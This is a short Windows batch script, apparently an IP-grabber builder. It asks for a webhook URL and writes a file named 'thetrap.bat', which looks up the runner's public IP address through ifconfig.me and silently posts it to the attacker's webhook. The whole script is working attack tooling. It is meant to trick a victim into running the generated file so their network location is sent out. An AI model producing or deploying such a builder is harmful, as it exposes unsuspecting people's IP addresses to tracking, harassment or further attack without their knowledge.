@echo off
color 1
echo     _/_/_/_/  _/_/_/    _/_/_/_/  _/      _/  _/          _/_/      _/_/_/  
echo    _/        _/    _/  _/        _/_/    _/  _/        _/    _/  _/         
echo   _/_/_/    _/_/_/    _/_/_/    _/  _/  _/  _/        _/    _/  _/  _/_/    
echo  _/        _/    _/  _/        _/    _/_/  _/        _/    _/  _/    _/     
echo _/_/_/_/  _/    _/  _/_/_/_/  _/      _/  _/_/_/_/    _/_/      _/_/_/  
echo.
set /p url="Enter Webhook URL: "
echo @echo off >> thetrap.bat
echo cls >> thetrap.bat
echo for /f "tokens=*" %%%%a in ('curl -sS ifconfig.me') do (set publicip=%%%%a) >> thetrap.bat
echo set "webhook=%url%" >> thetrap.bat
echo set "message=IP: %%publicip%%" >> thetrap.bat
echo curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%%message%%\"}" %%webhook%% >> thetrap.bat
echo exit >> thetrap.bat
